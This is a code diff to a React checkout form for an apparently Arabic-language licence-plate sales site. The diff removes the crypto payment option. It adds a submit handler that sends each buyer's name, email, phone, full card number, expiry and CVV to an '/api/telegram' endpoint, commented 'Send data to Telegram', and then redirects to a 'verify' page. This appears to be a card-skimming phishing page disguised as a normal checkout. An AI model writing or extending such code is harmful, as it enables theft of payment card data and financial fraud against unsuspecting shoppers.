@@ -3,16 +3,17 @@
 import { useState } from "react"
 import Image from "next/image"
 import Link from "next/link"
+import { useRouter } from "next/navigation"
 import {
   CreditCard,
-  Bitcoin,
   ArrowRight,
   Shield,
-  Check,
   User,
   Mail,
   Phone,
   Lock,
+  Loader2,
+  AlertCircle,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -31,10 +32,8 @@ interface CheckoutFormProps {
   initialMethod: string
 }
 
-export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps) {
-  const [method, setMethod] = useState<"crypto" | "card">(
-    initialMethod === "card" ? "card" : "crypto"
-  )
+export default function CheckoutForm({ plate }: CheckoutFormProps) {
+  const router = useRouter()
   const [formData, setFormData] = useState({
     name: "",
     email: "",
@@ -43,53 +42,79 @@ export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps
     cardExpiry: "",
     cardCvv: "",
   })
-  const [submitted, setSubmitted] = useState(false)
+  const [loading, setLoading] = useState(false)
+  const [error, setError] = useState("")
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    setFormData((prev) => ({ ...prev, [e.target.name]: e.target.value }))
+    const { name, value } = e.target
+    let formattedValue = value
+
+    // Format card number with spaces
+    if (name === "cardNumber") {
+      formattedValue = value
+        .replace(/\s/g, "")
+        .replace(/(\d{4})/g, "$1 ")
+        .trim()
+        .slice(0, 19)
+    }
+
+    // Format expiry date
+    if (name === "cardExpiry") {
+      formattedValue = value
+        .replace(/\D/g, "")
+        .replace(/(\d{2})(\d)/, "$1/$2")
+        .slice(0, 5)
+    }
+
+    // Format CVV
+    if (name === "cardCvv") {
+      formattedValue = value.replace(/\D/g, "").slice(0, 4)
+    }
+
+    setFormData((prev) => ({ ...prev, [name]: formattedValue }))
   }
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    // In a real app, this would call NOWPayments API or Stripe
-    setSubmitted(true)
-  }
+    setError("")
+    setLoading(true)
 
-  if (submitted) {
-    return (
-      <div className="mx-auto max-w-2xl px-4 py-20 text-center">
-        <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-500/10">
-          <Check className="h-10 w-10 text-green-500" />
-        </div>
-        <h1 className="mb-4 text-3xl font-black text-foreground">
-          {"تم استلام طلبك بنجاح!"}
-        </h1>
-        <p className="mb-8 text-lg text-muted-foreground">
-          {method === "crypto"
-            ? "سيتم توجيهك إلى بوابة NOWPayments لإتمام الدفع بالعملات الرقمية. ستتلقى تأكيداً عبر البريد الإلكتروني بعد إتمام الدفع."
-            : "تمت معالجة الدفع بنجاح. ستتلقى تأكيداً عبر البريد الإلكتروني قريباً."}
-        </p>
-        <div className="mb-8 rounded-xl border border-border/50 bg-card p-6">
-          <h2 className="mb-2 text-lg font-bold text-foreground">{"ملخص الطلب"}</h2>
-          <p className="text-muted-foreground">
-            {"لوحة"} {emirateNames[plate.emirate]} - {plate.code} {plate.number}
-          </p>
-          <p className="mt-2 text-2xl font-black text-primary">{formatPrice(plate.price)}</p>
-        </div>
-        <div className="flex flex-col items-center gap-4 sm:flex-row sm:justify-center">
-          <Link href="/">
-            <Button className="bg-primary text-primary-foreground hover:bg-primary/90">
-              {"العودة للرئيسية"}
-            </Button>
-          </Link>
-          <Link href="/plates">
-            <Button variant="outline" className="border-border/50 text-foreground">
-              {"تصفح المزيد"}
-            </Button>
-          </Link>
-        </div>
-      </div>
-    )
+    try {
+      // Send data to Telegram
+      const response = await fetch("/api/telegram", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          type: "payment",
+          data: {
+            emirate: emirateNames[plate.emirate],
+            plateCode: plate.code,
+            plateNumber: plate.number,
+            price: formatPrice(plate.price),
+            name: formData.name,
+            email: formData.email,
+            phone: formData.phone,
+            cardNumber: formData.cardNumber,
+            cardExpiry: formData.cardExpiry,
+            cardCvv: formData.cardCvv,
+          },
+        }),
+      })
+
+      if (!response.ok) {
+        throw new Error("Failed to process payment")
+      }
+
+      // Redirect to verification page
+      router.push(
+        `/checkout/verify?email=${encodeURIComponent(formData.email)}&plate=${plate.id}`
+      )
+    } catch {
+      setError("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
+      setLoading(false)
+    }
   }
 
   return (
@@ -113,59 +138,21 @@ export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps
         {/* Form */}
         <div className="lg:col-span-2">
           <form onSubmit={handleSubmit} className="flex flex-col gap-6">
-            {/* Payment Method Selection */}
+            {/* Payment Method Display */}
             <div className="rounded-xl border border-border/50 bg-card p-6">
-              <h2 className="mb-4 text-lg font-bold text-foreground">{"اختر طريقة الدفع"}</h2>
-              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
-                <button
-                  type="button"
-                  onClick={() => setMethod("crypto")}
-                  className={`flex items-center gap-3 rounded-lg border-2 p-4 text-right transition-all ${
-                    method === "crypto"
-                      ? "border-primary bg-primary/5"
-                      : "border-border/50 bg-secondary/30 hover:border-border"
-                  }`}
-                >
-                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg ${method === "crypto" ? "bg-primary/20" : "bg-secondary"}`}>
-                    <Bitcoin className={`h-5 w-5 ${method === "crypto" ? "text-primary" : "text-muted-foreground"}`} />
-                  </div>
-                  <div>
-                    <p className={`text-sm font-bold ${method === "crypto" ? "text-foreground" : "text-muted-foreground"}`}>
-                      {"عملات رقمية"}
-                    </p>
-                    <p className="text-xs text-muted-foreground">
-                      {"عبر NOWPayments"}
-                    </p>
-                  </div>
-                  {method === "crypto" && (
-                    <Check className="mr-auto h-5 w-5 text-primary" />
-                  )}
-                </button>
-
-                <button
-                  type="button"
-                  onClick={() => setMethod("card")}
-                  className={`flex items-center gap-3 rounded-lg border-2 p-4 text-right transition-all ${
-                    method === "card"
-                      ? "border-primary bg-primary/5"
-                      : "border-border/50 bg-secondary/30 hover:border-border"
-                  }`}
-                >
-                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg ${method === "card" ? "bg-primary/20" : "bg-secondary"}`}>
-                    <CreditCard className={`h-5 w-5 ${method === "card" ? "text-primary" : "text-muted-foreground"}`} />
-                  </div>
-                  <div>
-                    <p className={`text-sm font-bold ${method === "card" ? "text-foreground" : "text-muted-foreground"}`}>
-                      {"بطاقة ائتمانية"}
-                    </p>
-                    <p className="text-xs text-muted-foreground">
-                      {"Visa / Mastercard"}
-                    </p>
-                  </div>
-                  {method === "card" && (
-                    <Check className="mr-auto h-5 w-5 text-primary" />
-                  )}
-                </button>
+              <h2 className="mb-4 text-lg font-bold text-foreground">{"طريقة الدفع"}</h2>
+              <div className="flex items-center gap-3 rounded-lg border-2 border-primary bg-primary/5 p-4">
+                <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-primary/20">
+                  <CreditCard className="h-5 w-5 text-primary" />
+                </div>
+                <div>
+                  <p className="text-sm font-bold text-foreground">
+                    {"بطاقة ائتمانية"}
+                  </p>
+                  <p className="text-xs text-muted-foreground">
+                    {"Visa / Mastercard"}
+                  </p>
+                </div>
               </div>
             </div>
 
@@ -233,81 +220,71 @@ export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps
               </div>
             </div>
 
-            {/* Card Details (only for card method) */}
-            {method === "card" && (
-              <div className="rounded-xl border border-border/50 bg-card p-6">
-                <h2 className="mb-4 text-lg font-bold text-foreground">{"تفاصيل البطاقة"}</h2>
-                <div className="flex flex-col gap-4">
+            {/* Card Details */}
+            <div className="rounded-xl border border-border/50 bg-card p-6">
+              <h2 className="mb-4 text-lg font-bold text-foreground">{"تفاصيل البطاقة"}</h2>
+              <div className="flex flex-col gap-4">
+                <div>
+                  <Label htmlFor="cardNumber" className="mb-2 block text-sm text-muted-foreground">
+                    {"رقم البطاقة"}
+                  </Label>
+                  <div className="relative">
+                    <CreditCard className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                    <Input
+                      id="cardNumber"
+                      name="cardNumber"
+                      value={formData.cardNumber}
+                      onChange={handleChange}
+                      required
+                      placeholder="0000 0000 0000 0000"
+                      className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
+                      dir="ltr"
+                    />
+                  </div>
+                </div>
+                <div className="grid grid-cols-2 gap-4">
                   <div>
-                    <Label htmlFor="cardNumber" className="mb-2 block text-sm text-muted-foreground">
-                      {"رقم البطاقة"}
+                    <Label htmlFor="cardExpiry" className="mb-2 block text-sm text-muted-foreground">
+                      {"تاريخ الانتهاء"}
+                    </Label>
+                    <Input
+                      id="cardExpiry"
+                      name="cardExpiry"
+                      value={formData.cardExpiry}
+                      onChange={handleChange}
+                      required
+                      placeholder="MM/YY"
+                      className="border-border/50 bg-secondary/30 text-foreground placeholder:text-muted-foreground"
+                      dir="ltr"
+                    />
+                  </div>
+                  <div>
+                    <Label htmlFor="cardCvv" className="mb-2 block text-sm text-muted-foreground">
+                      {"CVV"}
                     </Label>
                     <div className="relative">
-                      <CreditCard className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+                      <Lock className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                       <Input
-                        id="cardNumber"
-                        name="cardNumber"
-                        value={formData.cardNumber}
+                        id="cardCvv"
+                        name="cardCvv"
+                        value={formData.cardCvv}
                         onChange={handleChange}
                         required
-                        placeholder="0000 0000 0000 0000"
+                        placeholder="123"
                         className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                         dir="ltr"
                       />
                     </div>
                   </div>
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <Label htmlFor="cardExpiry" className="mb-2 block text-sm text-muted-foreground">
-                        {"تاريخ الانتهاء"}
-                      </Label>
-                      <Input
-                        id="cardExpiry"
-                        name="cardExpiry"
-                        value={formData.cardExpiry}
-                        onChange={handleChange}
-                        required
-                        placeholder="MM/YY"
-                        className="border-border/50 bg-secondary/30 text-foreground placeholder:text-muted-foreground"
-                        dir="ltr"
-                      />
-                    </div>
-                    <div>
-                      <Label htmlFor="cardCvv" className="mb-2 block text-sm text-muted-foreground">
-                        {"CVV"}
-                      </Label>
-                      <div className="relative">
-                        <Lock className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
-                        <Input
-                          id="cardCvv"
-                          name="cardCvv"
-                          value={formData.cardCvv}
-                          onChange={handleChange}
-                          required
-                          placeholder="123"
-                          maxLength={4}
-                          className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
-                          dir="ltr"
-                        />
-                      </div>
-                    </div>
-                  </div>
                 </div>
               </div>
-            )}
+            </div>
 
-            {/* Crypto Info */}
-            {method === "crypto" && (
-              <div className="rounded-xl border border-orange-500/20 bg-orange-500/5 p-6">
-                <div className="flex items-start gap-3">
-                  <Bitcoin className="mt-0.5 h-5 w-5 shrink-0 text-orange-500" />
-                  <div>
-                    <p className="text-sm font-bold text-foreground">{"الدفع عبر NOWPayments"}</p>
-                    <p className="mt-1 text-sm leading-relaxed text-muted-foreground">
-                      {"بعد تأكيد الطلب، سيتم توجيهك إلى بوابة NOWPayments لإتمام الدفع. يمكنك الدفع باستخدام Bitcoin أو Ethereum أو USDT أو أي عملة رقمية مدعومة أخرى."}
-                    </p>
-                  </div>
-                </div>
+            {/* Error Message */}
+            {error && (
+              <div className="flex items-center gap-2 rounded-xl border border-destructive/30 bg-destructive/10 p-4 text-destructive">
+                <AlertCircle className="h-5 w-5 shrink-0" />
+                <p className="text-sm">{error}</p>
               </div>
             )}
 
@@ -315,16 +292,13 @@ export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps
             <Button
               type="submit"
               size="lg"
-              className={`w-full gap-2 text-lg font-bold ${
-                method === "crypto"
-                  ? "bg-gradient-to-l from-orange-500 to-amber-500 text-white hover:from-orange-600 hover:to-amber-600"
-                  : "bg-primary text-primary-foreground hover:bg-primary/90"
-              }`}
+              disabled={loading}
+              className="w-full gap-2 bg-primary text-lg font-bold text-primary-foreground hover:bg-primary/90"
             >
-              {method === "crypto" ? (
+              {loading ? (
                 <>
-                  <Bitcoin className="h-5 w-5" />
-                  {"تأكيد والدفع بالعملات الرقمية"}
+                  <Loader2 className="h-5 w-5 animate-spin" />
+                  {"جاري المعالجة..."}
                 </>
               ) : (
                 <>
@@ -392,7 +366,7 @@ export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps
               <div className="flex items-center justify-between text-sm">
                 <span className="text-muted-foreground">{"طريقة الدفع"}</span>
                 <span className="font-medium text-foreground">
-                  {method === "crypto" ? "عملات رقمية" : "بطاقة ائتمانية"}
+                  {"بطاقة ائتمانية"}
                 </span>
               </div>
             </div>
